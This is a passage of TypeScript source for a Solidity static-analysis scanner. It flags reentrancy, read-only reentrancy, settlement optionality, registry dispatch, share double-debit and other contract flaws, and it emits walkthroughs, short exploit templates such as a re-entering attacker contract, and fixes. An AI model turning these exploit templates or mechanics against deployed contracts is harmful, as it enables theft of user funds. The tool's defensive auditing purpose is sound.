  // reachability is uncertain because derived contracts exist in the
  // file (their entries are invisible from the base's own scan).
  const entriesByFn = computeEntries(contract, direct);
  const hasDerivedContracts = contractHasDerived(contract, model);

  let anyPayable = false;
  let anyValueSend = false;
  // Fix 12: read-only reentrancy needs the writer's own window — its
  // first post-call write line, its in-window reads, and its in-window
  // internal calls — plus each callee's reads. Collected per function
  // during the walk; the read-only loop below consumes them.
  const flowsByFn = new Map<string, Flow>();
  const reenterWrites = new Map<string, { fn: string; call: ExtCall; writeLine: number }>();

  for (const fn of contract.functions) {
    if (fn.mutability === "payable" || fn.isReceive) anyPayable = true;
    if (!fn.body) continue;
    const authed = isAuthed(fn, contract, model) || fn.isConstructor;
    const flow = walkFn(fn, contract, model, stateNames, byName, direct, parsed, delta, push, authed);
    flowsByFn.set(fn.name, flow);
    if (flow.sawCall && flowSends(flow)) anyValueSend = true;
    if (/(\.call\s*\{[^}]*value|\.transfer\s*\(|\.send\s*\()/.test(fn.source)) anyValueSend = true;

    // A constructor cannot be reentered either: during construction the
    // contract has no code at its address, so no external caller can
    // re-enter it mid-construction. FUUUU's constructor calls createPair
    // then assigns router/pair/exemptFee — flagged as reentrancy, but
    // there is no window. Same reason as the read-only skip below.
    if (flow.callThenWrite && flow.seen && !fn.isConstructor) {
      // Evidence checks before calling it reentrancy:
      // - transfer/send forward only 2300 gas: a reentrant call cannot fit
      //   in that stipend, so there is no reentrancy window at all. The
      //   post-call write is ordering hygiene, not an exploit.
      // - If a per-user credit mapping (balanceOf, balances, ...) was written
      //   BEFORE the call and no credit mapping is written AFTER it, the
      //   double-spend path is closed: a reentrant call hits the require
      //   against the already-debited balance. Only aggregate state
      //   (e.g. totalSupply) updates after the call.
      const stipendCall = flow.seen.kind === "transfer" || flow.seen.kind === "send";
      const creditVars = new Set(
        contract.stateVars.filter((v) => v.typeName.trim().startsWith("mapping(")).map((v) => v.name),
      );
      const creditSettledPreCall =
        [...flow.preCallWrites].some((w) => creditVars.has(w)) &&
        ![...flow.postCallWrites].some((w) => creditVars.has(w));

      // Fix 38 rungs — read the mechanics the 2026-10-25 fork sweep
      // proved decisive, before the severity ladder runs:
      // - an explicit low gas cap is the stipend lesson generalized:
      //   a value-bearing reentry needs 9,700 gas (CALL + value
      //   surcharge) before any callee code executes, so a cap at or
      //   below 10,000 cannot carry one (the dividend trackers' gas:
      //   3000 and gas: 0 payouts were flagged critical);
      // - a hand-rolled mutex (checked at entry, set before the call,
      //   cleared after) is a guard even without the modifier name;
      // - a post-call credit write that only runs on the failure arm
      //   is a ROLLBACK of a pre-call settlement (CEI holds), read
      //   from the branch structure — not a stale-state window;
      // - a call on a fixed stored contract (a router swap leg) hands
      //   control to that callee, never to the payee.
      const gasCap = flow.seen.gasCap ?? null;
      const gasCappedCall = !stipendCall && gasCap !== null && gasCap <= 10_000;
      const mutexVar = mutexAroundCall(fn, contract, parsed, delta, flow.seen.line);
      const rollbackVar = creditSettledPreCall
        ? null
        : rollbackSettledVar(fn, parsed, delta, flow.seen.line, flow.preCallWrites, flow.postCallWrites, creditVars);
      const fixedCalleeCall = flow.seen.kind === "member" && flow.seen.targetIsFixedContract === true;

      // Fix 38 attribution: an internal/private helper is judged
      // through its public entries — the finding names the entry, a
      // helper with NO proven public path produces no finding, and
      // the guard/auth verdicts are the entries' (weakest entry
      // governs). Entry guards credited here are modifier guards;
      // an entry's own hand-rolled mutex is credited only when the
      // flagged function IS the entry (the mutexVar rung above).
      const helperSite = !isExternallyCallable(fn);
      const fnEntries = entriesByFn.get(fn.name) ?? [];
      let provenanceDead = false;
      let displayName = fn.name;
      let entriesAllGuarded = false;
      let entriesAllAuthed = false;
      let possibleCapMods: string[] = [];
      if (helperSite) {
        if (fnEntries.length === 0) {
          provenanceDead = !hasDerivedContracts && contract.functions.some((f) => isExternallyCallable(f));
        } else {
          const evs = fnEntries.map((e) => ({ e, ev: authEvidenceOf(e, contract, model) }));
          entriesAllGuarded = evs.every((x) => hasGuard(x.e));
          entriesAllAuthed = evs.every((x) => x.ev.authed);
          const hasOpenEntry = evs.some((x) => !x.ev.authed && !hasGuard(x.e) && x.ev.possibleMods.length === 0);
          if (!hasOpenEntry) possibleCapMods = [...new Set(evs.flatMap((x) => x.ev.possibleMods))];
          const chosen = evs.find((x) => !x.ev.authed && !hasGuard(x.e)) ?? evs[0];
          if (chosen) displayName = chosen.e.name;
        }
      } else {
        const selfEv = authEvidenceOf(fn, contract, model);
        if (!selfEv.authed) possibleCapMods = selfEv.possibleMods;
        entriesAllAuthed = selfEv.authed;
      }
      const guarded = hasGuard(fn) || mutexVar !== null || entriesAllGuarded;
      const effectiveAuthed = authed || entriesAllAuthed;

      const severity: Severity = stipendCall || gasCappedCall
        ? "info"
        : guarded || creditSettledPreCall || rollbackVar !== null || fixedCalleeCall
          ? "low"
          : flow.seen.sendsValue || flow.seen.kind === "call" || flow.seen.kind === "delegatecall"
            ? "critical"
            : flow.seen.kind === "member" || flow.seen.kind === "erc20"
              ? "medium"
              : "high";
      const title = stipendCall
        ? `State written after a 2300-gas transfer in ${displayName} — no reentrancy window`
        : gasCappedCall
          ? `State written after a ${gasCap}-gas capped call in ${displayName} — no reentrancy window`
          : rollbackVar !== null
            ? `Reentrancy: ${displayName} restores a pre-call credit only when the payout fails`
            : guarded
              ? `State is written after an external call in ${displayName}, but a reentrancy guard is present`
              : creditSettledPreCall
                ? `Reentrancy: ${displayName} updates non-credit state after an external call`
                : fixedCalleeCall
                  ? `Reentrancy: ${displayName} writes state after a call to a fixed stored contract`
                  : `Reentrancy: ${displayName} updates state after an external call`;
      const summary = stipendCall
        ? `${displayName} calls ${flow.seen.kind} at line ${flow.seen.line}, which forwards only 2300 gas — a reentrant call cannot fit in that stipend, so there is no window for an attacker to re-enter before the storage update. The post-call write is ordering hygiene, not an exploit.`
        : gasCappedCall
          ? `${displayName} caps the external call at line ${flow.seen.line} to ${gasCap} gas. A reentrant value call needs 9,700 gas (the CALL opcode plus the value-transfer surcharge) before any callee code runs, so no value-moving reentry fits inside the cap. The post-call write is ordering hygiene, not an exploit.`
          : rollbackVar !== null
            ? `${displayName} writes the caller's credit (${rollbackVar}) BEFORE the external call at line ${flow.seen.line}; the only post-call write to it sits in the failure branch of the call-outcome check and decrements it back. That is a rollback of an already-settled ledger — effects precede the call, so a reentrant call observes the settled value. The fork sweep confirmed this dividend pattern end-to-end: CEI holds, and the flagged write runs only when the payment fails.`
            : guarded
              ? mutexVar !== null
                ? `${displayName} still does the external call before the storage update, but the hand-rolled \`${mutexVar}\` mutex is checked at entry, set before the call and cleared after it — a reentrant call hits the flag and reverts. The ordering is still the bug the flag is papering over.`
                : entriesAllGuarded && helperSite
                  ? `${displayName} reaches the call-then-write helper ${fn.name} only through entry points that carry a reentrancy guard, so the window the ordering would open is closed at every public path. The ordering inside ${fn.name} is still the bug the guards are papering over.`
                  : `${displayName} still does the external call before the storage update. The guard should hold, but the ordering is the bug the guard is papering over.`
              : creditSettledPreCall
                ? `${displayName} hands control to another contract at line ${flow.seen.line}, then writes storage — but the caller's per-user credit was already debited before the call, so a reentrant call hits the balance check against the reduced balance and cannot double-spend. Only non-credit (aggregate) state updates after the call.`
                : fixedCalleeCall
                  ? `${displayName} calls ${flow.seen.target} at line ${flow.seen.line} — a stored contract address this function never assigns — then writes storage. The flagged call hands control to that fixed callee (a router executing a swap, in the sweep's shape), not to the payee: the payee's code never runs during this call and the caller cannot choose the target. Any reentry would have to come from the fixed callee itself, which is an integration-trust question, not a caller exploit.`
                  : `${displayName} hands control to another contract at line ${flow.seen.line}, then writes storage. The callee can re-enter and observe the stale values.`;
      if (!provenanceDead) {
        let finding = make({
          severity,
          swc: "SWC-107",
          title,
          confidence: guarded ? "medium" : "high",
          detector: "reentrancy",
          summary,
          walkthrough: reentrancyWalk(contract.name, fn, flow.seen),
          exploitSolidity: reentrancyExploit(contract.name, displayName),
          remediationSolidity: reentrancyFix(displayName),
          locationFn: displayName,
          locationLine: flow.seen.line,
          snippet: snippet(parsed, flow.seen.line + delta, delta),
        });
        finding = withAccessControlCap(finding, effectiveAuthed);
        if (!effectiveAuthed && possibleCapMods.length > 0) {
          finding = withGateCap(finding, unverifiedModifierNote(possibleCapMods));
        }
        push(finding);
      }
      // Read-only reentrancy only cares about vars that are actually stale
      // mid-callback: written AFTER the call. A var written only before the
      // call cannot be observed stale. And a 2300-gas transfer/send creates
      // no mid-callback window at all, so it produces no read-only surface.
      // And a constructor call cannot be reentered at all: during
      // construction the contract has no code at its address, so no
      // external caller can read its getters mid-callback. MyobuChef's
      // constructor calls router.WETH() before assigning WETH/startBlock/
      // numdays — flagged as 4 read-only highs, all impossible.
      if (!stipendCall && !fn.isConstructor) {
        for (const w of flow.postCallWrites) {
          const writeLine = flow.writeLines.get(w);
          if (writeLine !== undefined) reenterWrites.set(w, { fn: fn.name, call: flow.seen, writeLine });
        }
      }
    } else if (flow.writeThenCall && flow.sawCall && !fn.isConstructor && /for\s*\(|while\s*\(/.test(fn.source)) {
      push(make({
        severity: "medium",
        swc: "SWC-107",
        title: `External call inside a loop in ${fn.name}`,
        confidence: "medium",
        detector: "reentrancy",
        summary: "The loop both writes storage and calls out. Even if this iteration updates first, the callback can re-enter before later iterations finish.",
        walkthrough: reentrancyWalk(contract.name, fn, flow.seen),
        exploitSolidity: reentrancyExploit(contract.name, fn.name),
        remediationSolidity: reentrancyFix(fn.name),
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }

    scanSimple(fn, contract, model, parsed, delta, authed, push, {
      entries: entriesByFn.get(fn.name) ?? [],
      provenanceUncertain: hasDerivedContracts,
      contractHasEntries: contract.functions.some((f) => isExternallyCallable(f)),
    });
    // 2026 incident classes: caller-identity rules, kept out of scanSimple's
    // value-flow body so they read as one family.
    scanIncidentClasses(fn, contract, parsed, delta, authed, push);
    // 2021-2025 classes: dispatch, bridge handlers, ecrecover, oracle feeds.
    scanHistoricalFn(fn, contract, parsed, delta, authed, push);
    // 2022-2026 loss categories the corpus was thin on.
    scanModernClasses(fn, contract, parsed, delta, authed, push);
  }

  // Fix 12: read-only reentrancy fires ONLY on a demonstrated
  // in-contract stale-read path. A public getter that no in-contract
  // code reads in the window is not a finding — the "second protocol
  // reads the getter" story is speculation, and every reaudit in this
  // batch (MC2long ×11, StakeWar rounds(), F3Dx ×6, OTTERY ×4,
  // AsyncArtwork) showed it firing on getters nobody consumes.
  // Consumer shapes:
  //   (a) the writer itself reads the var after its call but before
  //       its write (self-read in-window);
  //   (b) the writer calls another function in that window which
  //       reads the var (callee-read in-window).
  // The window is (call line, first post-call write line). A read on
  // the call line itself (the call target) or on the write line does
  // not count. The finding names the demonstrated consumer.
  // Limitation: (b) only sees own-contract callees (byName). A
  // super/base-contract callee that reads the var is not tracked, so
  // such a path is missed — accepted for this batch; no transitive
  // callee-body analysis.
  for (const [varName, info] of reenterWrites) {
    const variable = contract.stateVars.find((v) => v.name === varName);
    if (variable?.visibility !== "public") continue;
    const writerFlow = flowsByFn.get(info.fn);
    let consumer: string | null = null;
    let consumerFn: string | null = null;
    if (writerFlow) {
      const selfReads = writerFlow.readLines.get(varName) ?? [];
      const selfRead = selfReads.find((l) => l > info.call.line && l < info.writeLine);
      if (selfRead !== undefined) {
        consumer = `${info.fn} itself reads ${varName} at line ${selfRead}, after the call but before the write`;
        consumerFn = info.fn;
      } else {
        for (const cc of writerFlow.calleeCalls) {
          if (cc.line <= info.call.line || cc.line >= info.writeLine) continue;
          const calleeReads = flowsByFn.get(cc.name)?.readLines.get(varName) ?? [];
          if (calleeReads.length > 0) {
            consumer = `${info.fn} calls ${cc.name} at line ${cc.line}, which reads ${varName}`;
            consumerFn = cc.name;
            break;
          }
        }
      }
    }
    if (consumer === null) continue;
    // Fix 35: a demonstrated consumer earns high only when it can move
    // value on the stale read. When the in-window consumer is itself a
    // view/pure function — the named-getter family from the archive
    // poll (round_(), uniswapV2Pair(), balances(), plyr_(), kLast(),
    // depositLock(), numOfShares(): ~102 critical/high rows, none
    // reproduced) — it merely RETURNS the stale value; nothing in the
    // window settles, pays out, or prices off it in a state-changing
    // path. That is low, and the summary names what would corroborate
    // high. The writer reading its own var in-window (self-read) is a
    // state-changing consumption and stays high. A consumer that
    // cannot be resolved in this contract (inherited) cannot be shown
    // to move value either, so it takes the low path.
    const consumerModel = consumerFn ? contract.functions.find((f) => f.name === consumerFn) : undefined;
    const getterOnlyConsumer =
      consumerFn !== null &&
      consumerFn !== info.fn &&
      (consumerModel === undefined || consumerModel.mutability === "view" || consumerModel.mutability === "pure");
    {
      push(make({
        severity: getterOnlyConsumer ? "low" : "high",
        swc: "SWC-107",
        title: `Read-only reentrancy on ${varName}()`,
        confidence: "medium",
        detector: "read-only-reentrancy",
        summary: getterOnlyConsumer
          ? `${info.fn} calls out before ${varName} is updated, and ${varName} is a public getter. The stale value is consumed in-contract: ${consumer}. Downgraded to low: the in-window consumer (${consumerFn}) is ${consumerModel ? "view/pure — it only returns the value" : "not resolvable in this contract — no value-moving use could be shown"}, so nothing in the window settles, pays out, or prices off the stale read in a state-changing path. This rises to high when a state-changing function in the window consumes the stale value to move value — a settle, mint, borrow, or payout computed from it.`
          : `${info.fn} calls out before ${varName} is updated, and ${varName} is a public getter. The stale value is consumed in-contract: ${consumer}.`,
        walkthrough: [
          `1. ${info.fn} transfers control at line ${info.call.line} via ${info.call.kind}.`,
          `2. ${varName} still holds the pre-call value, because the write happens at line ${info.writeLine}, after the call returns.`,
          `3. The stale value is consumed in-contract: ${consumer}.`,
          "4. A re-entrant call during the window observes the pre-call value and can price or settle off it.",
        ].join("\n"),
        exploitSolidity: `interface IVictim { function ${varName}(address) external view returns (uint256); function ${info.fn}() external; function ${consumerFn}() external; }
contract ReadOnlyAttack {
    function attack(address victim) external {
        IVictim(victim).${info.fn}();
    }
    receive() external payable {
        // The in-window consumer reads the stale value here.
        IVictim(msg.sender).${consumerFn}();
    }
}`,
        remediationSolidity: `// Update ${varName} before the call, and add a nonReentrant guard
// so view methods used as oracles are not observable mid-call.
modifier nonReentrant() {
    require(locked == 0);
    locked = 1;
    _;
    locked = 0;
}`,
        locationFn: `${varName}()`,
        locationLine: variable.line,
        snippet: snippet(parsed, variable.line + delta, delta),
      }));
    }
  }

  if (anyPayable && !anyValueSend) {
    push(make({
      severity: "info",
      swc: "SWC-132",
      // Info, not medium (2026-10-27): nothing is overwhelmed, and the
      // benchmark measured 41 firings on the SmartBugs corpus with a 0.00
      // signal rate. It is a real observation — payable in, no way out — but
      // it is not a denial of service and it is not exploitable on its own.
      title: `${contract.name} can receive ether it cannot send`,
      confidence: "medium",
      detector: "locked-ether",
      summary: "A payable function, receive, or fallback accepts ETH, and nothing in the contract transfers value out. The balance is stuck.",
      walkthrough: "1. Ether arrives through a payable entry.\n2. No call{value}, transfer, or send exists on this contract.\n3. There is no recovery path. Selfdestruct elsewhere does not help once the code is deployed.",
      exploitSolidity: "",
      remediationSolidity: `function rescue(address payable to) external onlyOwner {
    (bool ok, ) = to.call{value: address(this).balance}("");
    require(ok);
}`,
      locationFn: null,
      locationLine: contract.line,
      snippet: "",
    }));
  }

  const ownerDrain = contract.functions.some((fn) => isAuthed(fn, contract, model) && /address\(this\)\.balance/.test(fn.source) && /\.call\{|\.transfer\(/.test(fn.source));
  if (ownerDrain) {
    push(make({
      severity: "low",
      swc: null,
      title: `${contract.name} lets one privileged key move the whole balance`,
      confidence: "high",
      detector: "centralization",
      summary: "An authenticated function can forward address(this).balance. That is a rug path if the key is an EOA, a hot wallet, or a single signer.",
      walkthrough: "1. The function is gated, so this is not an unauthenticated theft.\n2. It is still a single point of failure: the key, not the rules, controls user funds.\n3. A timelock, a multisig, or a capped withdrawal changes the trust assumption.",
      exploitSolidity: "",
      remediationSolidity: `// Two-step: queue the withdrawal, execute after a delay.
// Or cap it: require(amount <= address(this).balance / 10);`,
      locationFn: null,
      locationLine: contract.line,
      snippet: "",
    }));
  }

  if (contract.bases.some((b) => /upgrade|proxy|erc1967/i.test(b)) && !contract.stateVars.some((v) => v.name === "__gap")) {
    push(make({
      severity: "low",
      swc: null,
      title: `${contract.name} looks upgradeable and has no storage gap`,
      confidence: "low",
      detector: "storage-gap",
      summary: "Inheritance from a proxy/upgrade base without a uint256[N] __gap means a later variable shifts every slot in child contracts.",
      walkthrough: "1. Upgradeable layouts are append-only.\n2. Inserting a variable in a base contract moves the child's slots and silently corrupts balances.\n3. Reserve a gap and shrink it when you add a variable.",
      exploitSolidity: "",
      remediationSolidity: "uint256[50] private __gap;",
      locationFn: null,
      locationLine: contract.line,
      snippet: "",
    }));
  }

  // D2 / D3 (2026-10-27): the two contract-level classes the games work
  // produced — settlement optionality and registry-dispatched logic. Both
  // need the whole contract, not one function.
  scanSettlementOptionality(contract, model, parsed, delta, push);
  scanRegistryDispatch(contract, parsed, delta, push);
  // The four deferred classes: cross-function invariants rather than shapes.
  scanShareDoubleDebit(contract, parsed, delta, push);
  scanSharedUnlockNetting(contract, parsed, delta, push);
  scanIdleGapInterest(contract, parsed, delta, push);
  scanSignatureFieldOmission(contract, parsed, delta, push);
  // 2021-2025 classes: bridges, governance, signatures, oracle plumbing.
  scanHistoricalContract(contract, model, parsed, delta, push);
}

// ---------------------------------------------------------------------------
// D2 / D3 (2026-10-27, the games work).
//
// The eight weak-randomness games audited in depth returned one genuine
// finding, and it was NOT an entropy bug: BlockChainCasino's commit/reveal
// binding is sound. The flaw is one hop later — settleBet pays the win,
// refundBet returns the full stake after BET_EXPIRATION_BLOCKS, and nothing
// on the house side forces settlement. Win -> settle, lose -> refund: the
// loss is free, so the bet is a free option that is profitable with perfect
// randomness. No entropy rule can see that, which is why 480 hits missed it.
//
// D3 is the other half: when a contract dispatches to a registered
// sub-contract (gameAddress[gameId]), the win rule lives THERE, and a
// detector that assumes it is how the caller reads it produces a confidently
// wrong exploit. Marked SEMANTICS_UNVERIFIED until that source is read.
// ---------------------------------------------------------------------------

/** Function names that settle a round (pays the win). */
const SETTLE_NAME = /(?:settle|resolve|claim|payout|finish|reveal|spin|roll|draw|cash\s?out)/i;
/** Function names that abandon a round (returns the stake). */
const REFUND_NAME = /(?:refund|cancel|abandon|expire|reclaim|withdrawbet|withdrawBet|bail)/i;
/** Evidence that the abandon path is time-gated. */
const TIMEOUT_EVIDENCE = /(?:block\.timestamp|block\.number|EXPIR\w*|TIMEOUT\w*|timeout|expire\w*|deadline|MAX_WAIT|BET_EXPIR\w*)/i;
/** A function that pays value out. */
const PAYS_OUT = /\.\s*(?:transfer|send|safeTransfer|safeTransferFrom)\s*\(|\.\s*call\s*\{\s*value/;

/** A callee resolved from a registry (mapping/array index), then dispatched to. */
function registryDispatch(body: string, paramNames: string[]): string | null {
  for (const p of paramNames) {
    const esc = escapeRegExp(p);
    // gameAddress[gameId].call(...) / IGame(games[id]).settle(...)
    const direct = new RegExp(`\\b([A-Za-z_$][\\w$]*)\\s*\\[[^\\]]*\\b${esc}\\b[^\\]]*\\]\\s*\\.\\s*(?:call|delegatecall|staticcall)\\s*[({]`).exec(body);
    if (direct) return direct[0];
    const cast = new RegExp(`\\bI[A-Z][\\w$]*\\s*\\(\\s*([A-Za-z_$][\\w$]*)\\s*\\[[^\\]]*\\b${esc}\\b[^\\]]*\\]\\s*\\)\\s*\\.`).exec(body);
    if (cast) return cast[0];
    // The common shape hoists the slot into a local first:
    //   address game = gameAddress[gameId];  …  game.call{value: …}(…)
    // Without following the alias, the detector misses every real dispatch.
    const aliasRe = new RegExp(
      `\\b([A-Za-z_$][\\w$]*)\\s*=\\s*[A-Za-z_$][\\w$]*\\s*\\[[^\\]]*\\b${esc}\\b[^\\]]*\\]`,
      "g",
    );
    for (const m of body.matchAll(aliasRe)) {
      const alias = m[1]!;
      const viaCall = new RegExp(`\\b${escapeRegExp(alias)}\\s*\\.\\s*(?:call|delegatecall|staticcall)\\s*[({]`).test(body);
      const viaCast = new RegExp(`\\bI[A-Z][\\w$]*\\s*\\(\\s*${escapeRegExp(alias)}\\s*\\)\\s*\\.`).test(body);
      if (viaCall || viaCast) return `${m[0].trim()} … ${alias} dispatch`;
    }
  }
  return null;
}

/**
 * D2: optional settlement — the free-option shape.
 *
 * Fires on a contract that has (a) a caller-initiated settle path that pays
 * out, (b) a caller-initiated refund path that pays the stake back after a
 * timeout, and (c) no privileged forced settlement. The severity is capped at
 * high with a note, because the actual magnitude (per-bet cap, bankroll,
 * timeout length) is a LIVE read — publishing a number from source constants
 * is the F-14 400x error this plan exists to stop.
 */
function scanSettlementOptionality(
  contract: ContractModel,
  model: SourceModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  const fns = contract.functions.filter((f) => f.body !== null && isExternallyCallable(f));
  const settle = fns.filter(
    (f) => SETTLE_NAME.test(f.name) && PAYS_OUT.test(f.source) && !isAuthed(f, contract, model),
  );
  const refund = fns.filter(
    (f) =>
      REFUND_NAME.test(f.name) &&
      PAYS_OUT.test(f.source) &&
      TIMEOUT_EVIDENCE.test(f.source) &&
      !isAuthed(f, contract, model),
  );
  // LOOSENED 2026-10-27 (recall-first): a refund-with-timeout plus ANY unguarded
  // payout path is enough. Requiring a function literally named settle/claim
  // missed games that settle through a differently named entry; the free option
  // exists as long as the stake can be recovered after a timeout and nothing
  // forces settlement. The finding is downgraded to low confidence when the
  // settle leg is inferred rather than named.
  const inferredSettle =
    settle.length === 0 && fns.some((f) => PAYS_OUT.test(f.source) && !isAuthed(f, contract, model));
  if (refund.length === 0) return;
  if (settle.length === 0 && !inferredSettle) return;
  // A house-side settlement closes the option: if a privileged caller can
  // settle (or force-settle) the round, the player cannot simply wait.
  const forced = fns.some((f) => SETTLE_NAME.test(f.name) && isAuthed(f, contract, model));
  if (forced) return;
  const s = settle[0] ?? refund[0]!;
  const r = refund[0]!;
  const inferred = settle.length === 0;
  push(make({
    severity: "high",
    swc: null,
    title: `${contract.name} lets a player choose the settlement: ${s.name} or ${r.name}`,
    confidence: inferred ? "low" : "medium",
    detector: "settlement-optionality",
    summary: `The player decides which branch settles. ${s.name} pays the win and ${r.name} returns the stake after a timeout, both callable by the same unprivileged account, and nothing on the house side forces settlement before the timeout. Win, settle. Lose, refund. The loss is free, so the bet is a free option — profitable with perfectly good randomness, which is why no entropy rule finds it. This is the BlockChainCasino shape (the only genuinely profitable finding in the eight-game set). The MAGNITUDE is a live read, not a source constant: fetch the per-bet cap, the timeout length, and the bankroll, and state them with any figure you publish.`,
    walkthrough: `1. ${s.name} is caller-initiated and pays out on a win; ${r.name} is caller-initiated and returns the stake once the timeout passes.\n2. After a losing round the player simply waits and calls ${r.name}, recovering the stake.\n3. The expected loss is therefore zero and the expected win is unchanged: the option has positive value for any non-zero win probability.\n4. Make settlement mandatory — a house-side or anyone-can-trigger settlement that resolves the round after the reveal window, with the refund path only available while the round is unresolved.`,
    exploitSolidity: `// Play, and only settle when the round won; otherwise wait out the timeout.\nif (predictedWin) { game.${s.name}(roundId); }\n// else: do nothing until the timeout, then\ngame.${r.name}(roundId); // stake back`,
    remediationSolidity: `// Settlement must not be optional. Resolve the round on a deadline:\nfunction resolveExpired(uint256 roundId) external {\n    require(block.timestamp > rounds[roundId].revealDeadline, "too early");\n    _settle(roundId); // pays the win, or closes the round as a loss\n}`,
    locationFn: s.name,
    locationLine: s.line,
    snippet: snippet(parsed, s.line + delta, delta),
  }));
}

/**
 * D3: the win rule lives in a registered sub-contract.
 *
 * A contract that resolves its callee from a registry (gameAddress[gameId])
 * and pays out on the result is only as correct as the rule inside that
 * sub-contract. A detector (or an exploit) that assumes the rule — "the win
 * is entropy % modulo" — can be confidently wrong: CoinAndRoulette dispatches
 * to whatever sits at gameAddress[gameId], so the mask-and-shift check the
 * exploit assumed does not apply to a non-standard game. The finding is
 * SEMANTICS_UNVERIFIED until that source is fetched and read.
 */
function scanRegistryDispatch(
  contract: ContractModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  for (const fn of contract.functions) {
    if (fn.body === null || !isExternallyCallable(fn)) continue;
    const body = stripCommentsAndStrings(fn.source);
    if (!PAYS_OUT.test(body)) continue;
    // LOOSENED 2026-10-27 (recall-first): the registry slot may be indexed by
    // something other than a parameter — msg.sender, a stored id, a loop
    // variable. Requiring a parameter index missed the dispatches where the id
    // arrives from storage or from the caller's identity.
    const dispatch =
      registryDispatch(body, fn.params.map((p) => p.name).filter(Boolean)) ??
      registryDispatch(body, ["msg.sender", "id", "index", "i"]);
    if (!dispatch) continue;
    push(make({
      severity: "medium",
      swc: null,
      title: `${fn.name} pays out on a rule that lives in a registered sub-contract`,
      confidence: "medium",
      detector: "registry-dispatched-logic",
      summary: `This function resolves its callee from a registry (${dispatch.trim()}) and moves value on the result. The win/payout rule therefore lives in whatever contract that slot holds, not in this source — so any reading of this contract's outcome (including an exploit that predicts the win condition) is SEMANTICS_UNVERIFIED until that sub-contract's source is fetched and read. This is the CoinAndRoulette shape: the exploit assumed entropy % modulo, but the contract dispatches to gameAddress[gameId], so a non-standard game would make the win check wrong while the exploit still "ran".`,
      walkthrough: `1. ${fn.name} reads a target address from a registry and calls it, then pays out based on the outcome.\n2. The rule that decides the payout is in the registered contract, which this analysis has not read.\n3. An exploit derived from this source alone can be wrong in either direction: it may claim a win the game does not pay, or miss the real condition.\n4. Fetch the registered implementation's source, derive the win/payout rule from it, and only then state a verdict.`,
      exploitSolidity: "",
      remediationSolidity: `// Not a code defect in itself — an analysis requirement. Read the registered\n// implementation before trusting any outcome rule:\naddress impl = gameAddress[gameId];\n// fetch impl source, derive win rule, then evaluate.`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }
}

// ---------------------------------------------------------------------------
// The deferred classes (2026-10-27, second pass).
//
// docs/recent-exploits-2026.md listed four mechanisms as deliberately NOT
// implemented, because a naive pattern match on each fires on correct code.
// That reasoning was right about the naive version and wrong about the
// alternative: each class has an INVARIANT a correct implementation must
// satisfy, and the rule can check the invariant instead of the shape.
//
//   share-accounting-double-debit   UNCX Vesting V2 (~$88k), Hedgey ($45M):
//     a per-position share field is debited from a global total by more than
//     one function and never cleared — so the same shares are removed twice.
//     INVARIANT: a field used to debit a total must be zeroed when debited.
//
//   shared-unlock-delta-netting     GoldPesa ($115k): a hook rebalances inside
//     a caller's open unlock, so an unsettled mint debt nets against the hook's
//     own burn credit. INVARIANT: a callback that both takes and settles must
//     verify the outstanding delta is settled first.
//
//   idle-gap-interest-accrual       BiFi (~$165k USDT): the whole inactive gap
//     is charged on every action in a block because the checkpoint is not
//     advanced unconditionally. INVARIANT: an accrual that multiplies elapsed
//     blocks must advance its checkpoint on the same path.
//
//   signature-field-omission        GiddyDeFi ($1.3M): the digest does not cover
//     every parameter, so the uncovered ones can be changed by a replayer.
//     INVARIANT: every parameter that authorises the action is inside the
//     signed digest.
// ---------------------------------------------------------------------------

/** Share-ish field names that a global total is debited from. */
const SHARE_FIELD = /(?:shares|share|amount|deposit|locked|balance)\b/i;
/** Global totals a position's shares are removed from. */
const SHARE_TOTAL = /(?:total|supply|pooled|poolShares|globalShares|aggregate)\w*/i;

/**
 * 1. share-accounting-double-debit.
 *
 * Collect every `total -= <expr>` / `total = total - <expr>` where `total`
 * looks like a global and `<expr>` reads a per-position field. Group by that
 * field: if two DIFFERENT functions debit the same field from a total, and no
 * function in the contract ever assigns the field to zero, the same shares can
 * be removed twice — which is the UNCX `release()`/`cancel()` shape and the
 * Hedgey claim/refund shape.
 *
 * The zero-assignment half is what keeps it off correct code: a vault that
 * clears the position when it debits passes, because it does.
 */
function scanShareDoubleDebit(
  contract: ContractModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  const debitSites = new Map<string, { fn: string; line: number }[]>();
  const totalNames = new Set<string>();
  for (const fn of contract.functions) {
    if (fn.body === null) continue;
    const body = stripCommentsAndStrings(fn.source);
    for (const m of body.matchAll(/\b([A-Za-z_$][\w$]*)\s*-\=\s*([^;]+)/g)) {
      const total = m[1]!;
      if (!SHARE_TOTAL.test(total)) continue;
      const rhs = m[2]!;
      // the field being removed: positions[id].shares / deposits[id].amount
      const field = [...rhs.matchAll(/\.\s*([A-Za-z_$][\w$]*)/g)]
        .map((x) => x[1]!)
        .find((name) => SHARE_FIELD.test(name));
      if (!field) continue;
      totalNames.add(total);
      const list = debitSites.get(field) ?? [];
      if (!list.some((e) => e.fn === fn.name)) list.push({ fn: fn.name, line: fn.line });
      debitSites.set(field, list);
    }
  }
  for (const [field, sites] of debitSites) {
    if (sites.length < 2) continue;
    const cleared = contract.functions.some((f) =>
      new RegExp(`\\.\\s*${escapeRegExp(field)}\\s*=\\s*(?:0|false)\\b`).test(f.source),
    );
    if (cleared) continue;
    const fns = sites.map((e) => e.fn);
    const first = sites[0]!;
    push(make({
      severity: "high",
      swc: null,
      title: `${contract.name} debits ${field} from a share total in ${fns.join(" and ")} without clearing it`,
      confidence: "medium",
      detector: "share-accounting-double-debit",
      summary: `Two different entry points remove the same per-position ${field} from a global total (${[...totalNames].join(", ")}), and nothing in the contract zeroes ${field} when it is debited. The second path therefore removes shares that are already gone, so the total under-counts the real deposits and a small position can withdraw tokens that belong to other depositors. This is the UNCX Vesting V2 shape (~$88k: release() debited the global share count but left the position's shares in place, then cancel() debited them again) and the Hedgey Finance shape ($45M, claim/refund).`,
